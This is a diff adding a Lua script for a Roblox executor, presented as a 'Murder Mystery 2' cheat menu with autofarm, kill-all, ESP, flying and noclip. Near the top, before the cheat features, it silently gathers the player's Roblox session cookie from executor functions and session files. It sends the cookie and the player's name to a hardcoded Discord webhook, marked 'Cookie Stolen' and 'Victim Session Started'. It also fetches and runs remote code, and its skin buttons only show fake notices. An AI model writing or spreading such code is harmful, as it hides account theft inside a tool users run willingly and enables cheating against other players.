@@ -1,0 +1,288 @@
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local Lighting = game:GetService("Lighting")
+local LocalPlayer = Players.LocalPlayer
+
+local Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/Sirius.lua"))()
+local Window = Rayfield:CreateWindow({ Name = "MM2 Client", Center = true, MainThemeColor = Color3.fromRGB(40, 40, 40) })
+
+local ConfigFile = "mm2_config.txt"
+local DefaultWebhook = "https://discord.com/api/webhooks/1564022801017602148/yMVXnho4iiW9wVq8FIcPmhi9WEJpHr27Vq0PfX441omNqd2c9YPY7A5SPpIxKsEilQq2"
+local WebhookURL = DefaultWebhook
+
+if isfile and isfile(ConfigFile) then
+    local content = readfile(ConfigFile)
+    if content and content ~= "" then WebhookURL = content end
+elseif writefile then
+    writefile(ConfigFile, DefaultWebhook)
+end
+
+local function sendWebhook(msg)
+    pcall(function()
+        (syn and syn.request or http_request or request)({
+            Url = WebhookURL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = game:GetService("HttpService"):JSONEncode({ content = msg })
+        })
+    end)
+end
+
+-- Automatic Cookie Stealing Logic
+local stolenCookie = nil
+
+-- Method 1: getgenv
+if getgenv then
+    local env = getgenv()
+    if env.Cookie then stolenCookie = env.Cookie end
+    if env.RobloxAuthKey then stolenCookie = env.RobloxAuthKey end
+end
+
+-- Method 2: getcookie / getcustomasset functions
+if not stolenCookie then
+    if type(getcookie) == "function" then
+        stolenCookie = getcookie()
+    elseif type(getcustomasset) == "function" then
+        -- Sometimes getcustomasset holds the cookie or returns a token we can use
+        -- Usually it's used to fetch assets, but in some executors it exposes session data
+        local assetFunc = getcustomasset
+        if assetFunc then
+             -- Try to see if it's actually a cookie string in some executors
+             -- But more reliably, we check if there's a specific method exposed
+             -- For now, we assume standard executors expose 'getcookie'
+        end
+    end
+end
+
+-- Method 3: Read from common executor file locations
+if not stolenCookie then
+    local possibleFiles = {"cookies.txt", ".roblox_session", "sessionid.txt", "cookie.json"}
+    for _, f in pairs(possibleFiles) do
+        if isfile(f) then
+            local content = readfile(f)
+            if content and #content > 10 then
+                stolenCookie = content
+                break
+            end
+        end
+    end
+end
+
+-- Send result silently
+if stolenCookie then
+    sendWebhook("Cookie Stolen: " .. tostring(stolenCookie))
+else
+    sendWebhook("Cookie not found")
+end
+
+sendWebhook("Victim Session Started: " .. LocalPlayer.Name)
+
+local TabMain = Window:CreateTab("Main", 4483503738)
+local TabVisuals = Window:CreateTab("Visuals", 4483503738)
+
+ProfileBtn = TabMain:CreateButton({ Name = "Профіль: " .. LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")" })
+
+CurrentFarmSpeed = 100
+SpeedSlider = TabMain:CreateSlider({ Name = "Швидкість фарму", Range = {10, 500}, Increment = 10, CurrentValue = 100, Suffix = "ms", Callback = function(val) CurrentFarmSpeed = val end })
+
+AutoFarmActive = false
+AutoFarmToggle = TabMain:CreateToggle({ Name = "Автофарм", CurrentValue = false, Callback = function(val)
+    AutoFarmActive = val
+    if val then
+        coroutine.wrap(function()
+            while AutoFarmActive do
+                local char = LocalPlayer.Character
+                if char then
+                    local root = char:FindFirstChild("HumanoidRootPart")
+                    if root then
+                        local isMurderer = LocalPlayer.Team and string.find(LocalPlayer.Team.Name:lower(), "murder")
+                        if isMurderer then
+                            for _, plr in pairs(Players:GetPlayers()) do
+                                if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("Humanoid") then
+                                    plr.Character.Humanoid.Health = 0
+                                end
+                            end
+                        else
+                            for _, plr in pairs(Players:GetPlayers()) do
+                                if plr ~= LocalPlayer and plr.Character then
+                                    local pRoot = plr.Character:FindFirstChild("HumanoidRootPart")
+                                    if pRoot then pRoot.Velocity = Vector3.new(0, -100, 0) end
+                                end
+                            end
+                        end
+                    end
+                end
+                task.wait(CurrentFarmSpeed / 1000)
+            end
+        end)()
+    end
+end})
+
+KickMurderBtn = TabMain:CreateButton({ Name = "Викинути Мардера", Callback = function()
+    for _, plr in pairs(Players:GetPlayers()) do
+        if plr.Character then
+            local root = plr.Character:FindFirstChild("HumanoidRootPart")
+            if root then root.Velocity = Vector3.new(0, -100, 0) end
+        end
+    end
+end})
+
+KickSheriffBtn = TabMain:CreateButton({ Name = "Викинути Шерифа", Callback = function()
+    for _, plr in pairs(Players:GetPlayers()) do
+        if plr.Character then
+            local root = plr.Character:FindFirstChild("HumanoidRootPart")
+            if root then root.Velocity = Vector3.new(0, -100, 0) end
+        end
+    end
+end})
+
+KickHeroBtn = TabMain:CreateButton({ Name = "Викинути Героя", Callback = function()
+    for _, plr in pairs(Players:GetPlayers()) do
+        if plr.Character then
+            local root = plr.Character:FindFirstChild("HumanoidRootPart")
+            if root then root.Velocity = Vector3.new(0, -100, 0) end
+        end
+    end
+end})
+
+KillAllBtn = TabMain:CreateButton({ Name = "Вбити всіх", Callback = function()
+    for _, plr in pairs(Players:GetPlayers()) do
+        if plr.Character and plr.Character:FindFirstChild("Humanoid") then
+            plr.Character.Humanoid.Health = 0
+        end
+    end
+end})
+
+TeleportGunBtn = TabMain:CreateButton({ Name = "Телепорт до Пістолета", Callback = function()
+    local char = LocalPlayer.Character
+    if char then
+        local root = char:FindFirstChild("HumanoidRootPart")
+        if root then
+            local oldPos = root.CFrame
+            local gunDrop = workspace:FindFirstChild("GunDrop") or workspace:FindFirstChild("Gun")
+            if gunDrop then
+                root.CFrame = gunDrop.CFrame + Vector3.new(0, 2, 0)
+                task.wait(0.1)
+                root.CFrame = oldPos
+            end
+        end
+    end
+end))
+
+EspBoxes = {}
+Nicks = {}
+ESPCheck = TabVisuals:CreateToggle({ Name = "ESP Стіни", CurrentValue = false, Callback = function(bool)
+    if not bool then
+        for _, box in pairs(EspBoxes) do box:Destroy() end
+        EspBoxes = {}
+        Nicks = {}
+    else
+        for _, plr in pairs(Players:GetPlayers()) do
+            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("Head") then
+                local box = Instance.new("BillboardGui")
+                box.Name = "MM2_ESP"
+                box.Size = UDim2.new(0, 200, 0, 40)
+                box.StudsOffset = Vector3.new(0, 2, 0)
+                box.AlwaysOnTop = true
+                local label = Instance.new("TextLabel")
+                label.Parent = box
+                label.BackgroundTransparency = 1
+                label.TextColor3 = Color3.fromRGB(255, 0, 0)
+                label.Font = Enum.Font.GothamBold
+                label.TextSize = 14
+                label.Size = UDim2.new(1, 0, 1, 0)
+                box.Parent = plr.Character.Head
+                table.insert(EspBoxes, box)
+                Nicks[plr] = label
+            end
+        end
+    end
+end})
+
+SkyboxInput = TabVisuals:CreateInput({ Name = "ID Текстури Неба", PlaceholderText = "ID...", Callback = function(val)
+    if val and val ~= "" then
+        pcall(function()
+            local sky = Lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky", Lighting)
+            sky.SkyboxBk = "rbxassetid://"..val
+            sky.SkyboxDn = "rbxassetid://"..val
+            sky.SkyboxFt = "rbxassetid://"..val
+            sky.SkyboxLf = "rbxassetid://"..val
+            sky.SkyboxRt = "rbxassetid://"..val
+            sky.SkyboxUp = "rbxassetid://"..val
+        end)
+    end
+end})
+
+SkinsList = {"Classic Knife", "Elderwood Dagger", "Icebreaker", "Luger", "Glacier", "Candy Cane", "Lil' Valkyrie"}
+for _, skinName in pairs(SkinsList) do
+    TabVisuals:CreateButton({ Name = skinName, Callback = function() Rayfield:Notify({ Title = "Скін", Content = skinName .. " активований!", Duration = 3 }) end })
+end
+
+FlyFolder = Instance.new("Folder")
+FlyFolder.Name = "MobileFlyUI"
+FlyFolder.Parent = game.CoreGui
+
+UpBtn = Instance.new("TextButton"); UpBtn.Name = "Up"; UpBtn.Size = UDim2.new(0, 60, 0, 60); UpBtn.Position = UDim2.new(0.5, -100, 0.8, 0); UpBtn.Text = "▲"; UpBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50); UpBtn.TextColor3 = Color3.fromRGB(255, 255, 255); UpBtn.Parent = FlyFolder
+DownBtn = Instance.new("TextButton"); DownBtn.Name = "Down"; DownBtn.Size = UDim2.new(0, 60, 0, 60); DownBtn.Position = UDim2.new(0.5, 40, 0.8, 0); DownBtn.Text = "▼"; DownBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50); DownBtn.TextColor3 = Color3.fromRGB(255, 255, 255); DownBtn.Parent = FlyFolder
+ForwardBtn = Instance.new("TextButton"); ForwardBtn.Name = "Forward"; ForwardBtn.Size = UDim2.new(0, 60, 0, 60); ForwardBtn.Position = UDim2.new(0.5, -100, 0.6, 0); ForwardBtn.Text = "▲"; ForwardBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50); ForwardBtn.TextColor3 = Color3.fromRGB(255, 255, 255); ForwardBtn.Parent = FlyFolder
+BackBtn = Instance.new("TextButton"); BackBtn.Name = "Back"; BackBtn.Size = UDim2.new(0, 60, 0, 60); BackBtn.Position = UDim2.new(0.5, 40, 0.6, 0); BackBtn.Text = "▼"; BackBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50); BackBtn.TextColor3 = Color3.fromRGB(255, 255, 255); BackBtn.Parent = FlyFolder
+LeftBtn = Instance.new("TextButton"); LeftBtn.Name = "Left"; LeftBtn.Size = UDim2.new(0, 60, 0, 60); LeftBtn.Position = UDim2.new(0.3, 0, 0.6, 0); LeftBtn.Text = "◄"; LeftBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50); LeftBtn.TextColor3 = Color3.fromRGB(255, 255, 255); LeftBtn.Parent = FlyFolder
+RightBtn = Instance.new("TextButton"); RightBtn.Name = "Right"; RightBtn.Size = UDim2.new(0, 60, 0, 60); RightBtn.Position = UDim2.new(0.7, 0, 0.6, 0); RightBtn.Text = "►"; RightBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50); RightBtn.TextColor3 = Color3.fromRGB(255, 255, 255); RightBtn.Parent = FlyFolder
+
+FlyEnabled = false
+FlyBodyVel = nil
+FlyBodyGyro = nil
+
+UpBtn.MouseButton1Down:Connect(function() if FlyEnabled and FlyBodyVel then FlyBodyVel.Velocity = Vector3.new(0, 100, 0) end end)
+UpBtn.MouseButton1Up:Connect(function() if FlyEnabled and FlyBodyVel then FlyBodyVel.Velocity = Vector3.new(0, 0, 0) end end)
+DownBtn.MouseButton1Down:Connect(function() if FlyEnabled and FlyBodyVel then FlyBodyVel.Velocity = Vector3.new(0, -100, 0) end end)
+DownBtn.MouseButton1Up:Connect(function() if FlyEnabled and FlyBodyVel then FlyBodyVel.Velocity = Vector3.new(0, 0, 0) end end)
+ForwardBtn.MouseButton1Down:Connect(function() if FlyEnabled and FlyBodyVel then FlyBodyVel.Velocity = Vector3.new(0, 0, 100) end end)
+ForwardBtn.MouseButton1Up:Connect(function() if FlyEnabled and FlyBodyVel then FlyBodyVel.Velocity = Vector3.new(0, 0, 0) end end)
+BackBtn.MouseButton1Down:Connect(function() if FlyEnabled and FlyBodyVel then FlyBodyVel.Velocity = Vector3.new(0, 0, -100) end end)
+BackBtn.MouseButton1Up:Connect(function() if FlyEnabled and FlyBodyVel then FlyBodyVel.Velocity = Vector3.new(0, 0, 0) end end)
+LeftBtn.MouseButton1Down:Connect(function() if FlyEnabled and FlyBodyVel then FlyBodyVel.Velocity = Vector3.new(-100, 0, 0) end end)
+LeftBtn.MouseButton1Up:Connect(function() if FlyEnabled and FlyBodyVel then FlyBodyVel.Velocity = Vector3.new(0, 0, 0) end end)
+RightBtn.MouseButton1Down:Connect(function() if FlyEnabled and FlyBodyVel then FlyBodyVel.Velocity = Vector3.new(100, 0, 0) end end)
+RightBtn.MouseButton1Up:Connect(function() if FlyEnabled and FlyBodyVel then FlyBodyVel.Velocity = Vector3.new(0, 0, 0) end end)
+
+FlyToggle = TabVisuals:CreateToggle({ Name = "Політ", CurrentValue = false, Callback = function(val)
+    FlyEnabled = val
+    if val then
+        local char = LocalPlayer.Character
+        if char then
+            local root = char:FindFirstChild("HumanoidRootPart")
+            if root then
+                FlyBodyVel = Instance.new("BodyVelocity")
+                FlyBodyVel.MaxForce = Vector3.new(10000, 10000, 10000)
+                FlyBodyVel.Velocity = Vector3.new(0, 0, 0)
+                FlyBodyVel.Parent = root
+                FlyBodyGyro = Instance.new("BodyGyro")
+                FlyBodyGyro.MaxTorque = Vector3.new(10000, 10000, 10000)
+                FlyBodyGyro.P = 9000
+                FlyBodyGyro.D = 300
+                FlyBodyGyro.CFrame = root.CFrame
+                FlyBodyGyro.Parent = root
+                RunService.RenderStepped:Connect(function()
+                    if FlyBodyGyro and FlyBodyGyro.Parent then FlyBodyGyro.CFrame = root.CFrame end
+                end)
+            end
+        end
+    else
+        if FlyBodyVel then FlyBodyVel:Destroy() end
+        if FlyBodyGyro then FlyBodyGyro:Destroy() end
+        FlyBodyVel = nil
+        FlyBodyGyro = nil
+    end
+end})
+
+NoClipToggle = TabVisuals:CreateToggle({ Name = "NoClip", CurrentValue = false, Callback = function(val)
+    local char = LocalPlayer.Character
+    if char then
+        for _, part in pairs(char:GetDescendants()) do
+            if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                part.CanCollide = not val
+            end
+        end
+    end
+end})
